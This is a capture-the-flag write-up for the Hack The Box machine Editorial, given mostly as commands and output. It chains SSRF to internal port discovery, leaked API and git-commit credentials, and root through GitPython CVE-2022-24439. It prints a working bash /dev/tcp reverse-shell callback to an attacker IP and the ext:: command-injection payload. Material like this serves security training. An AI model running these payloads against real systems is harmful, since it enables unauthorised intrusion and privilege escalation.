---
title: "Editorial — Speedrun"
summary: "The command chain only. SSRF to an internal port sweep, an API endpoint with credentials, a commit that gives up the production password, and a GitPython CVE for root."
date: 2026-09-08
draft: false
tier: speedrun
categories:
  - Offensive
tags:
  - Editorial
  - Hack The Box
  - Linux
  - Web
  - SSRF
  - Python
  - Git
ShowToc: true
TocOpen: false
---

Commands and output, one line per step. The reasoning, the dead ends, and why each pivot was chosen are in the [long version]({{< relref "/work/writeups/offensive/editorial" >}}).

Commands are formatted from my May notes rather than a fresh replay. The cloning call in step 9 comes from the source captured in [0xdf's write-up](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html#clone_changes); my notes did not preserve it.

Target: `<target>`, attacker: `10.10.14.153`. My notes never recorded the target address.

## Recon

```bash
nmap -p- --min-rate 10000 -T4 -oA nmap/allports <target>
nmap -sC -sV -p 22,80 -oA nmap/detail <target>
```

Ports 22 and 80 answer. My notes kept no scan output.

```bash
echo "<target> editorial.htb" | sudo tee -a /etc/hosts
```

The page has an upload field that takes a URL as well as a file.

## Foothold

**1. Confirm the SSRF.** The cover URL lands at `/upload-cover`. `http://127.0.0.1` returns `200`.

```bash
nc -lvnp 4444
```

Point the cover URL at `10.10.14.153:4444` and the request arrives. `User-Agent: python-requests`.

**2. Sweep localhost through it.** Every valid address returns `200` with the same placeholder JPEG, so filter on the body, not the status.

```bash
seq 1 65535 > ports.txt
```

Send `/upload-cover` to Intruder, mark the port, load that list. Port 5000 comes back different:

```text
static/uploads/671fb455-fbb8-4d16-aa89-332b5ee00c9c
```

**3. Read what 5000 returned.** The fetched body is stored as the "image", so pull the upload rather than the response.

```bash
cat 671fb455-fbb8-4d16-aa89-332b5ee00c9c | jq
```

```text
/api/latest/metadata/messages/promos
/api/latest/metadata/messages/coupons
/api/latest/metadata/messages/authors
/api/latest/metadata/messages/how_to_use_platform
/api/latest/metadata/changelog
/api/latest/metadata
```

**4. Request each endpoint through the same SSRF.** `authors` is the one that pays.

```bash
curl http://editorial.htb/static/uploads/ca85d32f-ac3f-41fe-a1b5-574bc2e46925 | jq
```

```text
Username: dev
Password: dev080217_devAPI!@
```

**5. Shell.**

```bash
ssh dev@editorial.htb
cat ~/user.txt
```

## Privilege escalation

**6. A git repository in dev's home.**

```bash
ls -la ~/apps
cd ~/apps
git status
git log
```

One commit is about downgrading the environment from production to development.

**7. Read that commit.**

```bash
git show <commit>
```

```text
prod:080217_Producti0n_2023!@
```

```bash
su prod
```

**8. What prod can run.**

```bash
sudo -l
```

```text
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

**9. The script hands our argument to GitPython, with the `ext::` transport already enabled.**

```python
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

```bash
pip freeze
```

GitPython is on 3.1.29, which is CVE-2022-24439.

**10. Root.** Percent-space is git's escape for a literal space, so the payload reaches `sh -c` as one argument.

```bash
echo "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1" > /tmp/shell.sh
nc -lvnp 4444
```

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

```bash
cat /root/root.txt
```

## Chain summary

1. The cover-image field fetches a URL server-side, which is SSRF on `/upload-cover`, and an out-of-band hit confirms it.
2. Every valid address returns 200 with the same JPEG, so the response body is the only usable oracle, and port 5000 answers differently.
3. What 5000 returned is saved as the uploaded "image", and it is JSON listing the internal API's metadata endpoints.
4. `/api/latest/metadata/messages/authors` carries `dev:dev080217_devAPI!@`.
5. SSH as dev gives the user flag.
6. `~/apps` is a git repository whose log holds a commit downgrading production to development.
7. `git show` on that commit gives `prod:080217_Producti0n_2023!@`.
8. prod may run `clone_prod_change.py` as root with any argument.
9. The script clones an attacker-supplied URL through GitPython 3.1.29 with `protocol.ext.allow` already enabled.
10. CVE-2022-24439 turns an `ext::` clone URL into a command, and the reverse shell returns as root.
